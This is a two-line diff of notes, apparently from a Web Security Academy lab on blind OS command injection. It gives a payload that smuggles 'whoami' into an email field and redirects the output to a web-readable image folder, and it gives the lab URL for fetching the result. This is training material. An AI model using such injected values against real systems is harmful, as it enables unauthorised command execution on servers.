@@ -1,0 +1,2 @@
+- Change the sent email value to `email=a||whoami+>+/var/www/images/output.txt||`
+- Endpoint for retrieval : `https://0a5e00a8030c338d81c76ba500e50084.web-security-academy.net/image?filename=output.txt`
